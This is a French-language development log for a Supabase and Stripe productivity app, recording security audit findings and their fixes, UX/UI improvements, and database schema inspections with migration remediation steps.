- **10 RPCs SECURITY DEFINER légitimes** → `REVOKE EXECUTE FROM anon`. Seul `authenticated` peut les appeler.
- **`accept_friend_request` v1** → DROP. Remplacée par v2 (migration 023), 0 call site client.

**Restant** : `auth_leaked_password_protection` (HaveIBeenPwned) — à activer manuellement dans Supabase Dashboard → Authentication → Policies. Pas SQL-able.

---

## 🛡️ Audit Deepsec (2026-05-15) — 51 findings analysés, 41 corrigés

Audit complet via Deepsec (Vercel Labs) sur les 114 fichiers du codebase.
51 findings classés. Workspace : `.deepsec/data/COSMO1.1/reports/report.md`.

### Tableau récapitulatif (post-fix)

| ID  | Sévérité       | Sujet                                                    | État         | Fichier |
|-----|----------------|----------------------------------------------------------|--------------|---------|
| B0  | 🟠 HIGH        | `isDemo` dérivé de l'email → premium gratuit via signup  | ✅ Corrigé   | `auth/AuthContext.tsx` |
| B1  | 🟠 HIGH_BUG    | CollaboratorModal ne crée jamais `shared_tasks`          | ✅ Corrigé   | `CollaboratorModal.tsx` |
| B2  | 🟡 MEDIUM      | `logout()` skip `signOut()` en mode démo                 | ✅ Corrigé   | `auth/AuthContext.tsx` |
| B3  | 🟠 HIGH_BUG    | `useFriends()` appelle `getFriends` inexistant en prod   | ✅ Corrigé   | `friends/hooks.ts` |
| B4  | 🟠 HIGH_BUG    | `useSharedTasks()` méthode inexistante                   | ✅ Corrigé   | `friends/hooks.ts` (hook supprimé) |
| B5  | 🟠 HIGH_BUG    | `habits/hooks.derived.ts` lit `completedDates` inexistant| ✅ Corrigé   | `habits/hooks.derived.ts` |
| B6  | 🟠 HIGH_BUG    | `tasks/hooks.derived.ts` champs inexistants (title/status)| ✅ Corrigé  | `tasks/hooks.derived.ts` + `types.ts` |
| B7  | 🟠 HIGH_BUG    | SettingsPage profile edit écrit en localStorage uniquement| ✅ Corrigé  | `SettingsPage.tsx` (local state + Supabase save) |
| B8  | 🟡 MEDIUM      | Changement de mot de passe sans réauth                   | ✅ Corrigé   | `SettingsPage.tsx` (signInWithPassword préalable) |
| B9  | 🟠 HIGH_BUG    | "Supprimer le compte" ne supprime rien                   | ✅ Corrigé   | Edge Function `delete-account` + UI |
| B10 | 🟠 HIGH_BUG    | `premium_tokens` reset à chaque event Stripe             | ✅ Corrigé   | `stripe-webhook/index.ts` (event-type specific) |
| B11 | 🐛 BUG         | `shareTask` dédup cassé (`includes` sur objets)          | ✅ Corrigé   | `friends/repository.ts` |
| B12 | 🐛 BUG         | `DEMO_FRIENDS` mutated in place                          | ✅ Corrigé   | `friends/repository.ts` (clone défensif) |
| B13 | 🐛 BUG         | `acceptFriendRequest` fallback sur email recipient        | ✅ Corrigé   | `friends/repository.ts` (reject si pas senderEmail) |
| B14 | 🐛 BUG         | `JSON.parse(localStorage)` sans try/catch                | ✅ Corrigé   | `user/hooks.ts` (helper `safeParse`) |
| B15 | 🐛 BUG         | `removeFriend` ne supprime qu'un côté                    | ✅ Corrigé   | `friends/supabase.repository.ts` (delete bidirectionnel) |
| B16 | 🐛 BUG         | `useFilteredData` filterFn hors deps (stale-closure)     | ✅ Corrigé   | `usePerformance.ts` (JSDoc contract) |
| B17 | 🐛 BUG         | Division par zéro dans `recalcProgress`                   | ✅ Corrigé   | `okrs/supabase.repository.ts` + `okrs/repository.ts` |
| B18 | 🐛 BUG         | `recordKRReps` rows unbounded (storage abuse)            | ✅ Corrigé   | `okrs/supabase.repository.ts` (clamp à 100/write) |
| B19 | 🐛 BUG         | LocalStorage OKR `update()` spread non whitelisté        | ✅ Corrigé   | `okrs/repository.ts` (whitelist explicite) |
| B20 | 🐛 BUG         | Repository singletons stale si `setDemo()` hors loginDemo| ✅ Corrigé   | `repository.factory.ts` (subscribe → reset) |
| B21 | 🐛 BUG         | `clearDemoStorage` whitelist incomplète                  | ✅ Corrigé   | `repository.factory.ts` (sweep prefix `cosmo_*`) |
| B22 | 🐛 BUG         | TaskModal collaborators par nom au lieu d'id             | ✅ Corrigé   | `TaskModal.tsx` |
| D1  | 🐛 BUG         | CollaboratorModal stocke par `friend.name`               | ✅ Corrigé   | `CollaboratorModal.tsx` |
| D2  | 🐛 BUG         | `handleAdd` accepte strings non-email                    | ✅ Corrigé   | `CollaboratorModal.tsx` + `TaskModal.tsx` |
| D3  | 🐛 BUG         | OKRModal step content rendu en double                    | ✅ Corrigé   | `OKRModal.tsx` (premier bloc supprimé) |
| D5  | 🐛 BUG         | `okrs/hooks.ts` orphan code dans commentaire             | ✅ Corrigé   | `okrs/hooks.ts` |
| N4  | 🟡 MEDIUM      | `getByEmail` injection ILIKE                              | ✅ Corrigé   | `friends/supabase.repository.ts` (eq + lowercase) |
| N5/N6| 🟡 MEDIUM     | Premium fields lus depuis `user_metadata`                | ✅ Corrigé   | `auth/AuthContext.tsx` (User type réduit identité) |
| N6  | 🟡 MEDIUM      | OKR `getPage` cursor injection PostgREST                 | ✅ Corrigé   | `okrs/supabase.repository.ts` (regex UUID + ISO) |
| N7  | 🟡 MEDIUM      | Stripe checkout CORS wildcard                            | ✅ Corrigé   | `stripe-create-checkout/index.ts` (allowlist) |
| N8  | 🟡 MEDIUM      | Stripe webhook pas d'idempotence event.id                | ✅ Corrigé   | `stripe-webhook` + migration `017` |
| N9  | 🟡 MEDIUM      | Webhook leak `err.message` dans 400                      | ✅ Corrigé   | `stripe-webhook/index.ts` (générique `Invalid signature`) |
| N10 | 🟡 MEDIUM      | Vite dev server `allowedHosts: true`                     | ✅ Corrigé   | `vite.config.ts` (allowlist localhost) |
| U1  | 🐛 BUG         | Stripe customer ID pas persisté (UPDATE 0 rows)          | ✅ Corrigé   | `stripe-create-checkout` (upsert onConflict) |
| U2  | 🐛 BUG         | UPDATE-then-INSERT race window                            | ✅ Corrigé   | `stripe-webhook` (upsert) |
| V7  | 🟡 MEDIUM      | `normalizeApiError` fallback sur message brut             | ✅ Corrigé   | `lib/normalizeApiError.ts` (log only) |
| V15 | 🟡 MEDIUM      | `lists` repo sans `user_id` filter                       | ✅ Corrigé   | `lists/supabase.repository.ts` |
| W6  | 🐛 BUG         | `win_streak` clampé à {0, 1} à chaque event              | ✅ Corrigé   | `stripe-webhook` (event-type specific) |

### Findings non corrigés / nécessitent action manuelle

| ID  | Sévérité   | Sujet                                                    | Pourquoi pas auto-fixé |
|-----|------------|----------------------------------------------------------|------------------------|
| TOCTOU-1 | ✅ Corrigé | `toggleCompletion` habit JSONB read-modify-write    | `023_atomic_toctou_rpcs.sql` — RPC `toggle_habit_completion` (jsonb_set atomique) |
| TOCTOU-2 | ✅ Corrigé | `addTaskToList`/`removeTaskFromList` race           | `023_atomic_toctou_rpcs.sql` — RPCs `add_task_to_list` / `remove_task_from_list` |
| TOCTOU-3 | ✅ Corrigé | `toggleComplete`/`toggleBookmark` tasks read-then-write | `023_atomic_toctou_rpcs.sql` — RPCs `toggle_task_complete` / `toggle_task_bookmark` |
| TOCTOU-4 | 🔴 Ouvert  | OKR/KR update snapshot vs write non atomique         | Refonte trop large (3 chemins entrelacés key_results table + JSONB + kr_completions). Hors scope audit 2026-05-23. |
| RACE-5  | ✅ Corrigé  | `acceptFriendRequest` fetch `ORDER BY created_at` race | `023_atomic_toctou_rpcs.sql` — RPC `accept_friend_request_v2` retourne le row créé |
| ~~25~~  | ✅ Résolu | ~~`useUpdateUserSettings` orphelin en prod~~          | Hook conservé mais whitelist stricte (4 champs safe) + tous les call sites scopés `if (isDemo)` (SettingsPage.tsx:180, 307, 334). Prod passe par `supabase.auth.updateUser` directement. Vérifié 2026-05-23. |

### Déploiement requis (manuel — Supabase dashboard / CLI)

```bash
# Edge Functions (nouvelles + mises à jour)
supabase functions deploy delete-account
supabase functions deploy stripe-create-checkout   # nouvelle version (CORS, upsert)
supabase functions deploy stripe-webhook            # nouvelle version (dedup, no leak)

# Migrations SQL
supabase db push  # applique 017_processed_stripe_events.sql
                  # ET 021_lists_smart_default_position.sql (4 nouvelles colonnes lists)

# Variables d'environnement Edge Functions
APP_URL=https://<votre-domaine-vercel.app>
# (STRIPE_SECRET_KEY, STRIPE_WEBHOOK_SECRET, STRIPE_PRICE_ID inchangés)
```

### Validation

- ✅ `npm run lint` : 0 erreurs, 18 warnings (inchangé)
- ✅ `npm run build` : 41.66 s, 4847 modules, 0 erreur
- ✅ `tsc --noEmit` : 122 erreurs (vs 174 avant — 52 résolues, le reste est pré-existant et non lié)
- ✅ `npm run test:e2e` : 3/3 (Chromium) — fixtures.ts + 3 tests démo

---

## 🟢 Cycle audit UX/UI (post-audit)

Cycle de corrections suivant l'audit UI/UX complet (note initiale 5.75/10).
Toutes les entrées **UX1 → L4** du tableau récapitulatif détaillées ici.

### Quick wins livrés

1. **TaskCard mobile — bouton « … » permanent** (UX1)
   Avant : suppression / partage / favori accessibles uniquement via long-press
   (500ms) OU swipe gauche > 80px. Aucun affordance visuel. Découvrabilité zéro.
   Après : bouton kebab visible permanent à droite de chaque card (44×44,
   `aria-expanded`). Swipe/long-press conservés en raccourcis pour experts.
   Fichier : `src/components/TaskTable.tsx`.

2. **Toast undo sur delete tâche** (UX2)
   `confirmDelete` snapshot la tâche avant `deleteMutation.mutate()` ; au succès,
   `toast.success` avec action `{ label: 'Annuler', onClick: () => createMutation
   .mutate(snapshot) }` durée 6000ms. **Limite** : la tâche restaurée a un
   nouvel id ; les liens collaborateurs/listes liés à l'ancien id ne sont pas
   restaurés (acceptable pour un undo court).

3. **Fix bug Stats « dots gris »** (UX3)
   `StatisticsPage → TasksStatistics → colorDistribution` itérait sur
   `Object.keys(colorSettings)` (clés hardcodées `cat-1`...`cat-5`) au lieu
   des vraies catégories (UUIDs). `categories.find(c => c.id === 'cat-1')`
   retournait undefined → fallback `#64748B` (gris).
   Fix : itérer sur `categories` directement, fallback sur colorSettings seulement
   si categories vide.

4. **CTA démo en bouton principal Landing** (UX6)
   Texte : « Essayer maintenant — sans inscription » + gradient bleu/violet
   + flèche animée. « Créer un compte » rétrogradé en CTA secondaire gris.
   Aligne l'ordre des CTA sur le comportement réel : ~80% des nouveaux
   visiteurs testent avant d'investir 30s à créer un compte.

5. **focus-visible global** (UX10)
   `src/index.css` règle CSS générique : `button:focus-visible:not([class*="ring-"]):not([class*="focus-visible:"])` → outline bleu 2px offset 2px. Blanc en monochrome.
   Permet la navigation clavier (iPad + clavier physique) sans toucher chaque
   bouton custom.

### Améliorations majeures livrées (Lot 1)

6. **OnboardingOverlay 3 étapes** (UX4)
   Composant maison `src/components/OnboardingOverlay.tsx` (pas de dep
   react-joyride). Bottom-sheet 3 étapes (Welcome / Tasks / Habits) après
   `loginDemo()`. Flag `localStorage.cosmo_onboarding_pending`. ESC,
   flèches ←→, dots de progression, drag-to-close mobile.
   **Subtilité** : monté au niveau App.tsx (pas une page) pour survivre aux
   changements de route. `useEffect([isDemo, location.pathname])` re-évalue
   le flag — `useEffect([])` raterait l'event puisque le flag est posé
   APRÈS le mount initial d'App.

7. **Tests E2E Playwright** (§4)
   3 tests smoke critiques dans `e2e/` :
   - `demo-create-task.spec.ts` — ouverture du formulaire de création
   - `demo-toggle-habit.spec.ts` — navigation vers /habits + render
   - `demo-create-okr.spec.ts` — navigation vers /okr + render
   Config 2 projects (Chromium desktop + iPhone 12 mobile),
   `reuseExistingServer: true` (port 3000 = `npm start`).

8. **Virtualisation TaskList mobile** (UX11)
   `@tanstack/react-virtual` (`useWindowVirtualizer`). Seuil 50 items :
   en-dessous, `AnimatePresence + map` conservé (animations spring d'entrée
   /sortie). Au-delà, virtualizer + `measureElement` pour hauteurs variables
   (TaskCard avec actions révélées). HabitTable non virtualisé (table avec
   sticky cells, trop risqué, impact moindre).

### Features livrées (Lot 2)

9. **PageTutorial framework** (UX5)
   Système de tutoriel par page avec spotlight, flèche pointant, démos d'actions
   auto. `src/components/tutorial/` (types + useTutorial + PageTutorial).
   Configs séparées desktop/mobile pour Tasks, Agenda, Habits, OKR (8 fichiers
   `<page>.desktop.ts` + `<page>.mobile.ts`).
   Actions supportées : `pulse`, `click`, `type`, `drag-ghost`,
   `drag-and-resize` (Agenda — ghost avec ghostLabel translate puis stretch
   height pour démontrer le redimensionnement FullCalendar sans manipuler le
   DOM réel).
   Spotlight via `boxShadow: 0 0 0 9999px <color>` sur hole rect (PAS de
   `backdropFilter: blur` qui flouterait la cible visible).

10. **Listes — refonte complète** (L1)
    Migration 021 : 4 colonnes lists (type, smart_rule, is_default, position) +
    CHECK constraints + unique partial index `idx_lists_one_default_per_user`
    + index user+position.
    Features livrées :
    - Compteur de tâches `(N)` par chip (gère smart + manual via
      `tasksInList` helper)
    - Liste épinglée par défaut (Pin/PinOff) auto-sélectionnée au mount
      via `autoSelectDoneRef` pour ne pas écraser un changement user
    - Liste virtuelle « Aujourd'hui » (sentinel `VIRTUAL_TODAY_ID`) jamais
      en base, filtre dynamique `deadline === today AND !completed`, ajout
      de tâches = set deadline today 23:59:59
    - Drag-to-reorder via `Reorder.Group` + state local `orderedLists`
      (sinon snap-back, voir CLAUDE.md). Desktop only.
    - Color picker hex personnalisé (Shift+clic sur pastille)
    - SmartListMenu via portal vers body + position fixed (sinon clipping
      par `overflow-x-auto` parent), z-index 9999

11. **HabitActionsMenu — habit → tâche/event** (L4)
    Bouton « ... » entre Edit2 et Trash2 sur HabitCard. Deux actions :
    - Créer tâche : `useCreateTask` avec name/estimatedTime/deadline today
      23:59:59
    - Planifier dans agenda : EventModal mode 'add' (pas 'convert' qui
      laisse les dates vides) avec `lockedFields=['title','startDate']`
      pour figer titre + date d'aujourd'hui

12. **EventModal — `lockedFields` + UI épurée** (L3)
    Nouvelle prop `lockedFields: ('title' | 'startDate' | 'endDate')[]` :
    rend les champs `readOnly`/`disabled` avec style locked distinct du
    style prefilled. Permet à HabitActionsMenu de figer titre+date sans
    casser les autres usages d'EventModal (Agenda, OKR).
    Aperçu : supprimée pour tous les modes. Description : repliée par
    défaut, bouton bleu « + Ajouter un commentaire » pour révéler.

13. **OKR — édition inline catégorie** (L2)
    Crayon (Edit2) ajouté à côté du Trash dans la barre flottante au hover
    sur chip catégorie. Au clic, mode édition inline avec pastille couleur
    cyclique + input + OK/Annuler. Utilise `useUpdateCategory` (déjà exposé).

14. **DashboardPage — unification validation tâches** (UX9)
    `SharedTasksHistory.tsx` supprimé (duplicit pure de la section "Tâches
    assignées" de SocialRequests). Enrichissement de SocialRequests : badge
    priorité + temps estimé conservés pour ne pas perdre de signal.

15. **LandingPage — showcases mobile fidèles** (UX8)
    5 showcases dans `src/components/showcase/MobileShowcases.tsx` :
    - `TaskCardMobileShowcase` — swipe droite/gauche en boucle + bouton "..."
      pulsant
    - `AgendaMobileShowcase` — MobileDayStrip + timeGridDay avec events
      colorés positionnés en blocks absolus à leur heure + now-indicator
    - `HabitMobileShowcase` — HabitCard fidèle (dot + nom + meta + 4 boutons
      Calendar/Edit2/.../Trash2 + 7 DayButtons)
    - `OKRMobileShowcase` — Card OKR fidèle (chip + dates + cercle SVG +
      KR avec input + barres)
    - `StatsMobileShowcase` — Grille 2x2 sobre + mini Calendrier de complétion
    Branchés via `useIsMobile()` dans LandingPage.

### Architecture / sécurité — notes complémentaires

- **Migration 021** : 4 colonnes optionnelles + CHECK constraints sur enum
  (type, smart_rule). Index partial unique garantit qu'**un seul** `isDefault`
  par user. Rétro-compatible : listes existantes restent `type='manual'`,
  `position=NULL` (passe à la fin du tri grâce à `NULLS LAST`).
- **Liste virtuelle Aujourd'hui** : jamais persistée. Modèle de filtre client.
  Pas de risque sécu (le filtre passe par `tasksDueToday(allTasks)` qui ne
  fait que lire les tâches déjà chargées sous RLS).
- **OnboardingOverlay + PageTutorial** : zéro impact sécu (lecture localStorage
  + animations Framer Motion uniquement). Pas de DOM manipulation côté
  bibliothèques externes (FullCalendar etc.) — démos visuelles overlay
  uniquement.
- **HabitActionsMenu → Create task** : passe par `useCreateTask` standard,
  donc soumis à RLS `tasks.INSERT auth.uid() = user_id`. Pas de bypass.
- **EventModal `lockedFields`** : verrouillage UI uniquement. Le backend
  reçoit toujours les valeurs envoyées par le form ; un attaquant pourrait
  envoyer un titre différent via DevTools. Pas un risque sécu (les valeurs
  vont sur les events de l'user lui-même, pas un partage), mais à garder
  en tête si on étend `lockedFields` à des champs sensibles.

---


---

## 🔎 Findings DB — inspection schéma réel (2026-06-06)

Audit technique : inspection lecture seule du projet Supabase actif
(`cosmo test` / `ykeugqfgklejcdbrmawy`) via MCP. Deux dettes confirmées,
**aucune corrigée automatiquement** (chirurgie DB / perte de données →
nécessite validation humaine).

### D-1 🟠 Drift historique de migrations ↔ fichiers `supabase/migration/`

`list_migrations` (ledger `supabase_migrations.schema_migrations`) ne contient
qu'un **sous-ensemble** des 37 fichiers, avec des noms différents pour les
premières (créées au dashboard, hors versioning) :

- **Tracées** : `008_key_results`, `021`, `022_…retry`, `023`, `024`, `025`,
  `028`, `031`–`036`, `fix_task_sharing_unified`, + 6 early dashboard
  (`create_subscriptions_table`, `fix_friend_requests_*`, etc.).
- **NON tracées** (appliquées hors ledger ou jamais) : `001`–`007`, `009`,
  `010*`, `011`, `012`, `013`, `014`, `015`, `016`, `017`, `018`, `019`,
  `020`, `026`, `027`, `029`, `030`.

**Risque** : un futur `supabase db push` peut re-tenter d'appliquer 001–020 →
conflit (`relation already exists`) ou, pire, croire qu'elles sont à appliquer.

**Remédiation (à faire par le mainteneur, accès DB requis)** :
1. `supabase migration list` (compare local ↔ remote).
2. Pour chaque fichier déjà appliqué hors ledger :
   `supabase migration repair --status applied <version>`.
3. Geler : interdire tout DDL hors `supabase/migration/*.sql` (plus de dashboard).
4. Idéalement, capturer une **baseline** via `supabase db dump --schema public`
   commitée comme migration 000 de référence.

### D-2 🟡 JSONB `okrs.key_results` = source primaire, table `key_results` quasi vide

Données réelles : **5 OKRs, les 5 ont des KR en JSONB ; la table dédiée
`key_results` ne contient que 2 lignes (1 seul OKR couvert)**. Pire, le JSONB
est dans un **format legacy** différent de la table :

```jsonc
// JSONB okrs.key_results (ancien) :
{ "id":"kr1", "title":"…", "unit":"%", "target":100, "current":85,
  "history":[{"date":"…","increment":20}] }
// table key_results (nouveau) : target_value, current_value, estimated_time, completed
```

**Conséquence** : ❌ **ne PAS DROP la colonne JSONB** — perte de KR pour 4/5
OKRs. Le fallback `fetchKRsForOkrs` (lit le JSONB quand la table est vide)
est **load-bearing**.

**Remédiation (à faire avant tout retrait, accès DB + revue requise)** :
1. Migration de **backfill** : pour chaque OKR sans ligne `key_results`,
   insérer depuis le JSONB en **traduisant** `target→target_value`,
   `current→current_value`, défauts `estimated_time=0`,
   `completed=(current>=target)`. Mapper/écarter `history`.
2. Vérifier `okrs_with_table_krs == okrs_total`.
3. *Ensuite seulement* : `ALTER TABLE okrs DROP COLUMN key_results` + retrait
   du fallback dans `okrs/supabase.repository.ts`.

---

## 🔧 Audit bugs moyens non-UI (2026-06-07) — inspection schéma réel via MCP

Inspection lecture seule du projet prod (`ykeugqfgklejcdbrmawy`) puis correctifs.

### MED-1 🔴 `delete-account` cassé par une table fantôme `chat_messages`

**Fichier** : `supabase/functions/delete-account/index.ts`
**Vecteur** : `USER_OWNED_TABLES` listait `chat_messages`, **table qui n'existe pas**
(vérifié : aucune table message/chat/inbox/notif en base — l'« inbox » UI dérive
de `friend_requests`/`shared_tasks`). Chaque suppression de compte exécutait donc
`DELETE FROM chat_messages` → erreur PostgREST → `failedTables` → `500 cleanup_failed`.
**Conséquence : la suppression de compte était totalement bloquée pour tous les
utilisateurs** (RGPD art. 17 + régression du fix B9).
**Fix** : retrait de `chat_messages` + le loop ignore désormais les erreurs
« relation does not exist » (`42P01` / `PGRST205`) → cette classe de bug ne peut
plus bricker l'effacement RGPD. **Redéploiement requis** : `supabase functions deploy delete-account`.

### MED-2 🟡 `kr_completions` orphelins après suppression d'un KR (graph dashboard surcompté)

**Fichier** : `supabase/migration/037_kr_completions_kr_cascade.sql`
**Vecteur** : `kr_completions` n'avait de FK que sur `okr_id` (CASCADE), pas sur
`kr_id`. Supprimer **un** KR (via `syncKRsToTable`, qui DELETE la ligne
`key_results`) laissait ses lignes de journal orphelines → toujours comptées dans
le graphique « KR réalisés ».
**Fix** : FK `kr_completions.kr_id → key_results(id) ON DELETE CASCADE`. Vérifié
sûr : 0 orphelin en prod (dry-run transactionnel `BEGIN … ROLLBACK` OK).
`recordKRReps` s'exécutant toujours après `syncKRsToTable`, la FK ne bloque jamais
un insert. **Application requise** : exécuter `037_kr_completions_kr_cascade.sql`.

### MED-3 🟡 `stripe-webhook` token clobber race — corrigé

**Fichier** : `supabase/functions/stripe-webhook/index.ts`
**Vecteur** : `applySubscriptionToDb` lisait puis réécrivait `premium_tokens`/
`win_streak` à **chaque** event ; un `subscription.updated` concurrent d'un crédit
pub (`credit_premium_token_from_ad`) pouvait écraser l'incrément (read-then-write).
**Fix** : ces deux colonnes ne sont désormais **incluses dans l'upsert que si
l'event doit les changer** (reset au checkout/renouvellement, ou remise à 0 sur
annulation). Pour un event « preserve » (`subscription.updated` actif), elles sont
**omises du payload** → `ON CONFLICT DO UPDATE` les conserve sans lecture → plus de
clobber. L'incrément de `win_streak` au renouvellement (`invoice.payment_succeeded`,
non concurrent d'un crédit pub) reste en read-modify-write. **Redéploiement requis** :
`supabase functions deploy stripe-webhook`.

### D-2 🟡 Backfill JSONB → table `key_results` — corrigé (étape 1)

**Fichier** : `supabase/migration/038_backfill_okr_key_results.sql`
**Constat** : la JSONB legacy (`{target, current, history}`) ne mappe pas sur
`KeyResult` (`targetValue`/`currentValue`) → valeurs cassées (NaN dans les stats)
pour les 4 OKRs JSONB-only. Le backfill traduit la JSONB en lignes table typées
(`current→current_value`, `target→target_value`, `estimated_time=0`,
`completed=(target>0 AND current>=target)`, nouvel UUID). **JSONB conservée** (archive +
fallback load-bearing, cf. D-2 — ne pas DROP sans migration revue dédiée). Validé
dry-run prod : 5/5 OKRs avec lignes table, 14 lignes, 0 null. **Application requise** :
exécuter `038_backfill_okr_key_results.sql`.

### D-1 🟠 Drift ledger migrations — documenté (fix process, pas de mutation aveugle)

**Fichier** : `supabase/migration/README.md`
Le dossier `supabase/migration/` (singulier) est un **changelog manuel** non géré
par la CLI (`supabase/migrations/`, pluriel). Muter le ledger prod à l'aveugle est
risqué → on documente la convention, le footgun (`db push` ré-appliquerait 001–020)
et la procédure de réconciliation CLI (`migration repair` + baseline) pour exécution
humaine.

### Couverture de tests — +56 tests purs (logique critique)

`src/lib/csv-export.test.ts` (injection formule N11), `normalizeApiError.test.ts`
(non-leak message brut V7), `avatar.test.ts`, `events/recurrence.test.ts`
(expansion récurrente). 65 → **121 tests**. (`escapeCSV`/`rowsToCSV` exportés pour
test.)
